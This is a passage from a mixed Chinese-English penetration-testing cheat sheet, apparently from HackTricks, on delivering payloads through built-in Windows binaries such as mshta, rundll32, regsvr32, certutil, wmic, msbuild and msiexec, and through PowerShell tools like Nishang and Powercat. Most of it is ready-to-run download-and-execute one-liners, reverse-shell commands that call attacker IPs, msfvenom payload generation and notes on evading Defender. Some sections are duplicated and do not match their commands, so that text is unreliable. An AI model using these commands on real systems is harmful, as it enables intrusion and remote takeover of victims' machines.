Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that allows you to exploit the Mshta vulnerability.

To use this module, you need to set the `SRVHOST`, `SRVPORT`, and `URIPATH` options. The `SRVHOST` and `SRVPORT` options specify the IP address and port number of the Metasploit listener, while the `URIPATH` option specifies the path of the HTML application.

Once the options are set, you can run the exploit by executing the `exploit` command. This will start the Metasploit listener and serve the malicious HTML application. When the target opens the HTML application, the payload will be executed on their system.

It is important to note that the Mshta vulnerability is a client-side vulnerability, meaning that it relies on the target opening the malicious HTML application. Therefore, social engineering techniques may be necessary to convince the target to open the application.

#### **Mshta - Metasploit**

Mshta是Microsoft HTML应用程序宿主，允许您在Windows系统上执行HTML应用程序（.hta文件）。它是一个合法的Windows组件，但攻击者也可以使用它来执行恶意代码。

Metasploit是一个流行的渗透测试框架，提供了一个名为`exploit/windows/browser/mshta`的模块，允许您利用Mshta漏洞。

要使用此模块，您需要设置`SRVHOST`、`SRVPORT`和`URIPATH`选项。`SRVHOST`和`SRVPORT`选项指定Metasploit侦听器的IP地址和端口号，而`URIPATH`选项指定HTML应用程序的路径。

设置选项后，可以通过执行`exploit`命令来运行利用程序。这将启动Metasploit侦听器并提供恶意HTML应用程序。当目标打开HTML应用程序时，负载将在其系统上执行。

需要注意的是，Mshta漏洞是一种客户端漏洞，意味着它依赖于目标打开恶意HTML应用程序。因此，可能需要使用社交工程技术来说服目标打开应用程序。
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**被防御者检测到**

## **Rundll32**

[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
执行网络调用的进程：**rundll32.exe**\
写入磁盘的有效载荷：**IE 本地缓存**

**被防御者检测到**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL (Dynamic Link Library) functions. It can be used to load and execute malicious DLLs, making it a useful tool for post-exploitation activities.

Metasploit, a popular penetration testing framework, provides a module called `windows/local/execute` that leverages Rundll32 to execute arbitrary DLLs on a target system.

To use this module, follow these steps:

1. Start Metasploit by running the `msfconsole` command.
2. Search for the `windows/local/execute` module using the `search` command.
3. Load the module using the `use` command followed by the module path.
4. Set the required options using the `set` command. These options include the `DLL` parameter, which specifies the path to the DLL to be executed, and the `PROC` parameter, which specifies the function to be executed within the DLL.
5. Run the module using the `run` command.

Once the module is executed, the specified DLL will be loaded and the specified function will be executed on the target system.

It is important to note that the DLL being executed should be compatible with the target system architecture (32-bit or 64-bit). Additionally, the DLL should be carefully crafted to avoid detection by antivirus software.

Using Rundll32 with Metasploit can be an effective way to maintain persistence on a compromised system and perform various post-exploitation tasks. However, it is crucial to use this technique responsibly and only in authorized penetration testing scenarios.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes Rundll32 for post-exploitation is Koadic.

Koadic is a post-exploitation RAT (Remote Access Tool) that provides a command-and-control interface to interact with compromised systems. It uses Rundll32 to load a malicious DLL, which then establishes a connection with the attacker's command-and-control server.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using Rundll32, which executes the code within the DLL. Once the connection is established, the attacker can remotely control the compromised system, execute commands, and exfiltrate data.

It's important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to help defenders protect their systems against such attacks.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32是Windows操作系统中的一个命令行实用程序，用于注册和注销动态链接库（DLL）文件。它可以用于执行各种操作，包括加载DLL文件、注册COM组件和解除注册。以下是一些常用的Regsvr32命令：

- `regsvr32 /s <DLL文件路径>`：静默注册DLL文件。
- `regsvr32 /u /s <DLL文件路径>`：静默解除注册DLL文件。
- `regsvr32 /i /s <DLL文件路径>`：静默安装DLL文件。
- `regsvr32 /n /i:<InstallCommand> /s <DLL文件路径>`：使用自定义安装命令静默安装DLL文件。

请注意，Regsvr32命令需要以管理员权限运行。
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
执行网络调用的进程：**regsvr32.exe**\
写入磁盘的载荷：**IE 本地缓存**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**被Defender检测到**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used to execute arbitrary code. Metasploit provides a module called `regsvr32_command_delivery` that allows you to use Regsvr32 to execute a payload on a target system.

To use this module, follow these steps:

1. Start Metasploit by running `msfconsole` in your terminal.
2. Search for the `regsvr32_command_delivery` module by typing `search regsvr32_command_delivery`.
3. Load the module by typing `use exploit/windows/local/regsvr32_command_delivery`.
4. Set the required options, such as `SESSION` (the session to run the payload on) and `CMD` (the command to execute).
5. Run the exploit by typing `exploit`.

The payload will be executed on the target system using Regsvr32, allowing you to gain remote access or perform other actions on the compromised system.

Note: This technique may trigger antivirus alerts, so it is important to use it responsibly and in controlled environments.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**您可以使用stager regsvr非常容易地下载并执行Koadic僵尸**

## Certutil

下载一个B64dll文件，解码并执行它。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
下载一个B64exe文件，解码并执行它。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**被防御者检测到**

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起之时掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声望积分，并登上每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中赚取收益！

{% embed url="https://hackenproof.com/register" %}

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload delivery method. By creating a malicious VBScript or JScript payload and executing it using Cscript, an attacker can gain remote access to a compromised Windows system.

To use Cscript with Metasploit, follow these steps:

1. Generate a malicious VBScript or JScript payload using the `msfvenom` command in Metasploit. For example, to generate a reverse shell payload:

   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f vbs -o payload.vbs
   ```

   Replace `<attacker IP>` and `<attacker port>` with your own IP address and port.

2. Transfer the generated payload (`payload.vbs`) to the target Windows system. This can be done using various methods, such as email, file sharing, or exploiting vulnerabilities in other software.

3. On the target Windows system, open a command prompt and navigate to the directory where the payload is located.

4. Execute the payload using Cscript:

   ```
   cscript payload.vbs
   ```

   This will run the payload and establish a reverse shell connection to the attacker's machine.

It is important to note that using Cscript as a payload delivery method may trigger antivirus or security software detections. To bypass these detections, techniques such as obfuscation or encryption can be used to make the payload more difficult to detect.

By leveraging the power of Cscript and Metasploit, an attacker can exploit vulnerabilities in Windows systems and gain unauthorized access for further malicious activities.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**被防御者检测到**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**被防御者检测到**

## **MSIExec**

攻击者
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
受害者：
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**检测到**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
执行网络调用的进程：**wmic.exe**\
写入磁盘的有效载荷：**IE本地缓存**

示例xsl文件：
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
从[这里](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)提取

**未被检测到**

**您可以使用stager wmic轻松下载并执行Koadic僵尸**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

您可以使用此技术绕过应用程序白名单和Powershell.exe限制。因为您将收到一个PS shell的提示。\
只需下载并执行此文件：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**未被检测到**

## **CSC**

在受害者机器上编译C#代码。
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
您可以从这里下载一个基本的C#反向shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**未检测到**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**我还没有尝试过**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**我还没有尝试过**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell反弹Shell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

在**Shells**文件夹中，有很多不同的反弹Shell。要下载并执行Invoke-_PowerShellTcp.ps1_，请复制该脚本并将其附加到文件末尾：
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
开始在Web服务器上提供脚本，并在受害者端执行它：
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender目前尚未将其检测为恶意代码（截至2019年3月4日）。

**TODO: 检查其他nishang shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

下载，启动一个Web服务器，启动监听器，并在受害者端执行它：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender目前尚未将其识别为恶意代码（截至2019年3月4日）。

**powercat提供的其他选项：**

绑定shell、反向shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成载荷、提供文件...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

创建一个PowerShell启动器，将其保存在一个文件中，然后下载并执行它。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**检测到恶意代码**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

使用unicorn创建metasploit后门的powershell版本
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
使用创建的资源启动msfconsole：
```
msfconsole -r unicorn.rc
```
启动一个Web服务器，提供_powershell\_attack.txt_文件，并在受害者上执行以下操作：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**检测到恶意代码**

## 更多

[PS>Attack](https://github.com/jaredhaight/PSAttack) 预加载了一些具有攻击性的PS模块的PS控制台（加密）\
[WinPWN](https://github.com/SecureThisShit/WinPwn) 预加载了一些具有攻击性的PS模块和代理检测的PS控制台（IEX）

## 参考文献

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof 是所有加密货币漏洞赏金的家园。**

**即时获得奖励**\
HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在 web3 渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起之时掌握 web3 安全。

**成为 web3 黑客传奇**\
每次验证的漏洞都会获得声望积分，并登上每周排行榜的榜首。

[**在 HackenProof 上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在 HackTricks 中看到您的公司广告吗？或者您想获得最新版本的 PEASS 或下载 PDF 格式的 HackTricks 吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或在 **Twitter** 上 **关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>
